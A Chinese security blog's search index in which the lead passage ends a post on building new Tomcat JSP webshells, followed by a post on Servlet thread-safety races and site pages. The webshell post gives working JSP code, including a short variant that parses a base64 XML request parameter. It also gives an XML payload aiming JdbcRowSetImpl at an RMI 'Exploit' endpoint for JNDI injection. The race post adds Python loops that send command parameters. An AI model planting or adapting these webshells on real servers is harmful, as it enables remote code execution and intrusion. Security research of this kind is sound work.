</span>&#123;</span><br><span class="line">        Digester contextDigester = createContextDigester();</span><br><span class="line">        contextDigester.getParser();</span><br><span class="line">----------------</span><br><span class="line">        contextConfig(contextDigester);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到函数<code>contextConfig</code>中传入一个<code>contextDigester</code>对象，这个对象我们也很好得到，虽然这是一个protected修饰的函数，但是里面的过程却都是public修饰的，因此我们直接复制出来即可</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/6.png"></p><p>继续跟进执行在<code>org.apache.catalina.startup.ContextConfig#contextConfig</code>，最开始我们便提到了要么从标准上下文，要么则是默认值<code>conf/context.xml</code>，那么为了扩展攻击面利用我们肯定选择前者</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/7.png"></p><h2 id="流程实现构造Webshell"><a href="#流程实现构造Webshell" class="headerlink" title="流程实现构造Webshell"></a>流程实现构造Webshell</h2><p>因此，我们再梳理一下上面的利用流程</p><p>1.实例化ContextConfig</p><p>2.获取StandardContext，添加到ContextConfig的context</p><p>3.初始化Digester对象</p><p>4.调用ContextConfig的contextConfig函数执行利用过程</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.startup.ContextConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.digester.Digester&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.HashMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.ArrayList&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.digester.RuleSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.startup.ContextRuleSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.startup.NamingRuleSet&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    ContextConfig ctConfig = <span class="keyword">new</span> ContextConfig();</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取StandardContext</span></span><br><span class="line">    Field reqF = request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    Request req = (Request) reqF.get(request);</span><br><span class="line">    StandardContext stcontext = (StandardContext) req.getContext();</span><br><span class="line">    stcontext.setDefaultContextXml(<span class="string">&quot;/tmp/context.xml&quot;</span>);</span><br><span class="line">    Field context = ContextConfig.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    context.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    context.set(ctConfig,stcontext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//实例化Digester对象</span></span><br><span class="line">    Digester digester = <span class="keyword">new</span> Digester();</span><br><span class="line">    digester.setValidating(<span class="keyword">false</span>);</span><br><span class="line">    digester.setRulesValidation(<span class="keyword">true</span>);</span><br><span class="line">    HashMap&lt;Class&lt;?&gt;, List&lt;String&gt;&gt; fakeAttributes = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    ArrayList&lt;String&gt; attrs = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    attrs.add(<span class="string">&quot;className&quot;</span>);</span><br><span class="line">    fakeAttributes.put(Object.class, attrs);</span><br><span class="line">    digester.setFakeAttributes(fakeAttributes);</span><br><span class="line">    RuleSet contextRuleSet = <span class="keyword">new</span> ContextRuleSet(<span class="string">&quot;&quot;</span>, <span class="keyword">false</span>);</span><br><span class="line">    digester.addRuleSet(contextRuleSet);</span><br><span class="line">    RuleSet namingRuleSet = <span class="keyword">new</span> NamingRuleSet(<span class="string">&quot;Context/&quot;</span>);</span><br><span class="line">    digester.addRuleSet(namingRuleSet);</span><br><span class="line">    digester.getParser();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用contextConfig函数执行利用过程</span></span><br><span class="line">    Method contextConfig = ContextConfig.class.getDeclaredMethod(<span class="string">&quot;contextConfig&quot;</span>, Digester.class);</span><br><span class="line">    contextConfig.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    contextConfig.invoke(ctConfig,digester);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>在浏览器直接访问，成功弹出</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/8.png"></p><h2 id="深入思考"><a href="#深入思考" class="headerlink" title="深入思考"></a>深入思考</h2><p>难道这就够了吗，看着这串又臭又长的webshell我一点都不满足，我想让这个webshell更短一点，那么为了实现这一步那就得跟深入的对利用流程进行跟踪</p><p>我们可以发现在<code>org.apache.catalina.startup.ContextConfig#contextConfig</code>，在调用<code>processContextConfig</code>的时候</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/9.png"></p><p>可以看到在实际上主要的步骤还是在对<code>Digester</code>对象继续的添加加载器等操作以及最终调用parse函数，在其中唯一多出来的部分就是这个InputSource</p><p>那么去掉一些无关的操作最终得到，当然这部分就是自己寻找的过程就没必要写进来了</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    org.apache.tomcat.util.digester.Digester digester = <span class="keyword">new</span> org.apache.tomcat.util.digester.Digester();</span><br><span class="line">    digester.addRuleSet(<span class="keyword">new</span> org.apache.catalina.startup.ContextRuleSet(<span class="string">&quot;&quot;</span>, <span class="keyword">false</span>));</span><br><span class="line">    org.xml.sax.InputSource inputSource = <span class="keyword">new</span> org.xml.sax.InputSource();</span><br><span class="line">    inputSource.setByteStream(<span class="keyword">new</span> java.io.ByteArrayInputStream(java.util.Base64.getDecoder().decode(request.getParameter(<span class="string">&quot;cmd&quot;</span>))));</span><br><span class="line">    digester.parse(inputSource);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>测试执行成功</p><p><img src="/2022/02/03/year/2022/2/jsp%E6%96%B0webshell%E7%9A%84%E6%8E%A2%E7%B4%A2%E4%B9%8B%E6%97%85/10.png"></p><p>其中cmd解码内容为</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;utf-8&#x27;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Context</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Manager</span> <span class="attr">className</span>=<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span></span></span><br><span class="line"><span class="tag">             <span class="attr">dataSourceName</span>=<span class="string">&quot;rmi://127.0.0.1/Exploit&quot;</span></span></span><br><span class="line"><span class="tag">             <span class="attr">autoCommit</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">Manager</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Context</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当然还有个关键的就是不要忘了启动一个恶意jndi服务</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Tomcat </tag>
            
            <tag> Jsp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Servlet的线程安全问题</title>
      <link href="/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"/>
      <url>/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Servlet的线程安全问题"><a href="#Servlet的线程安全问题" class="headerlink" title="Servlet的线程安全问题"></a>Servlet的线程安全问题</h1><h2 id="引入"><a href="#引入" class="headerlink" title="引入"></a>引入</h2><p>首先看看这样的代码，有什么问题</p><p>这里既要求cmd不能包含<code>Calculator</code>又必须要包含<code>Calculator</code>，能做到吗，当然是可以的</p><p><img src="/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/1.png"></p><h2 id="Servlet的多线程机制"><a href="#Servlet的多线程机制" class="headerlink" title="Servlet的多线程机制"></a>Servlet的多线程机制</h2><p>Servlet实际上是一个单件，当我们第一次请求某个Servlet时，Servlet容器将会根据web.xml配置文件或者是注解实例化这个Servlet类，之后如果又有新的客户端请求该Servlet时，则一般不会再实例化该Servlet类，这说明了什么呢？简单来说，当多个用户一起访问时，得到的其实是同一个Servlet实例，这样的话，他们对实例的成员变量的修改其实会影响到别人，所以在开发的时候如果没有注意这个问题往往会有一些额安全问题，而往往Servlet的线程安全问题主要是由于实例变量使用不当而引起</p><p>因此我们再看上面的代码，很明显我们看到了这个<code>status</code>状态变量是实例变量，当然这里为了突出并发的效果，这里加了一个延时，这里简简单单用python实现竞争，也不必上多线程了简单点</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/?cmd=open -na Calculator&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Cal&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1:8080/?cmd=ls&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    r = requests.get(url)</span><br></pre></td></tr></table></figure><p><img src="/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/2.png"></p><h2 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h2><h3 id="1-实现-SingleThreadModel-接口"><a href="#1-实现-SingleThreadModel-接口" class="headerlink" title="1.实现 SingleThreadModel 接口"></a>1.实现 SingleThreadModel 接口</h3><p>该接口指定了系统如何处理对同一个<em>Servlet</em>的调用。如果一个<em>Servlet</em>被这个接口指定，那么在这个<em>Servlet</em>中的<em>service</em>方法将不会有两个线程被同时执行，当然也就不存在线程安全的问题。这种方法只要继承这个接口就行了,因此将我们上面的代码改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span> <span class="keyword">implements</span> <span class="title">SingleThreadModel</span> </span></span><br></pre></td></tr></table></figure><p>这样你觉得就完全安全了吗？？答案也不是，如果我们将上面的对状态的定义加上static呢</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> status;</span><br></pre></td></tr></table></figure><p>lol，还是可以成功，原因是SingleThreadModel不会解决所有的线程安全隐患。会话属性和静态变量仍然可以被多线程的多请求同时访问</p><p><img src="/2022/02/03/year/2022/2/Servlet%E7%9A%84%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/3.png"></p><p>还有一点很重要<strong>该接口在Servlet　API 2.4中将不推荐使用。</strong></p><h3 id="2-避免使用成员变量"><a href="#2-避免使用成员变量" class="headerlink" title="2.避免使用成员变量"></a>2.避免使用成员变量</h3><p>既然问题出自成员变量，那么我们就尽量避免去使用它</p><p>将上面的代码改为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    public  boolean status;</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        <span class="keyword">boolean</span> status = <span class="keyword">true</span>;</span><br><span class="line">        String cmd = req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>)) &#123;</span><br><span class="line">            status = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!status) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>))&#123;</span><br><span class="line">            resp.getWriter().write(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-同步对共享数据的操作"><a href="#3-同步对共享数据的操作" class="headerlink" title="3.同步对共享数据的操作"></a>3.同步对共享数据的操作</h2><p>使用synchronized 关键字能保证一次只有一个线程可以访问被保护的区段，因此可以将代码写为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestServlet</span> <span class="keyword">extends</span> <span class="title">HttpServlet</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span>  <span class="keyword">boolean</span> status;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span></span></span><br><span class="line"><span class="function">            <span class="keyword">throws</span> ServletException, IOException </span>&#123;</span><br><span class="line">        String cmd = req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">boolean</span> status;</span><br><span class="line">        <span class="keyword">synchronized</span>(<span class="keyword">this</span>) &#123;</span><br><span class="line">            status = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>)) &#123;</span><br><span class="line">                status = <span class="keyword">false</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Thread.sleep(<span class="number">5000</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!status) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (cmd.contains(<span class="string">&quot;Calculator&quot;</span>))&#123;</span><br><span class="line">            resp.getWriter().write(cmd);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="思考与小结"><a href="#思考与小结" class="headerlink" title="思考与小结"></a>思考与小结</h2><p>但是如果利用上面三种方式去修复，这样就完全没问题了吗？并不是</p><p>比如实现SingleThreadModel以及在程序中使用同步来保护要使用的共享的数据，在实际业务当中这也会使得我们系统的性能大大下降，这也是我们不太希望看到的，前者为每个新的请求创建一个单独的Servlet实例，这将引起大量的系统开销，而后者被同步的代码块在同一时刻也只能有一个线程执行它，这也会导致在高并发的情况下，同时处理请求的吞吐量显著的降低</p><p>因此，在Serlet中避免使用实例变量或许是更好的选择，但如果无法避免，但如果无法避免，也应该尽量做到去同步可用性最小的代码路径</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/chanshuyi/p/5052426.html">https://www.cnblogs.com/chanshuyi/p/5052426.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/93708538">https://zhuanlan.zhihu.com/p/93708538</a></p><p><a href="https://www.jianshu.com/p/06260e0667a9">https://www.jianshu.com/p/06260e0667a9</a></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>文章归档</title>
      <link href="/archive.html"/>
      <url>/archive.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/friend.html"/>
      <url>/friend.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul><li><a href="https://nexmoe.com/" title="折影轻梦"><img src="https://avatar.mixcm.com/github/nexmoe" alt="折影轻梦"></a></li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>About me</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="👋Hi，I’am-Y4tacker"><a href="#👋Hi，I’am-Y4tacker" class="headerlink" title="👋Hi，I’am Y4tacker"></a>👋Hi，I’am Y4tacker</h3><blockquote><p>宁静致远，淡泊明志</p></blockquote><ul><li>🔭 CTFer: @0x401 Team(The third captain)/@R3kapig(Member)</li><li>⭐️ Github: <a href="https://github.com/Y4tacker">https://github.com/Y4tacker</a></li><li>🍔 Blog: <a href="http://y4tacker.github.io/">http://y4tacker.github.io/</a></li><li>💡 Alibaba Coud</li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>search</title>
      <link href="/search/index.html"/>
      <url>/search/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>article</title>
      <link href="/article/index.html"/>
      <url>/article/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><ul><li><a href="https://4ra1n.github.io/">4ra1n</a>: 许少！！！</li><li><a href="https://websecuritys.cn/">远海</a> : 凡是过往,皆为序章.</li><li><a href="https://ek1ng.com/">ek1ng</a>:  YESTERDAY YOU SAID TOMORROW.</li><li><a href="https://www.snakin.top/">Snakinya</a>: 苍山负雪，明烛天南.</li><li><a href="https://blog.zgsec.cn/">曾哥</a>: 弱小和无知不是生存的障碍，傲慢才是！</li><li><a href="https://miaotony.xyz/">MiaoTony</a>: 仰望星空，脚踏实地，未来可期.</li><li><a href="https://www.r3gr3t.com/">R3gr3t</a>: 战队Web师傅&amp;学弟.</li></ul><h1 id="Binary"><a href="#Binary" class="headerlink" title="Binary"></a>Binary</h1><ul><li><a href="https://minhal.me/">Minhal</a>: 战队逆向师傅&amp;学长</li><li><a href="https://crazymanarmy.github.io/">CrazyMan</a>: 空白！！！</li><li><a href="https://apeng.re/">apeng</a>: Reverse Everything</li><li><a href="https://xia0ji233.pro/">xia0ji233</a>: 老当益壮，宁移白首之心？穷且益坚，不坠青云之志.</li></ul>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script>]]></content>
      
    </entry>
    
    
  
</search>
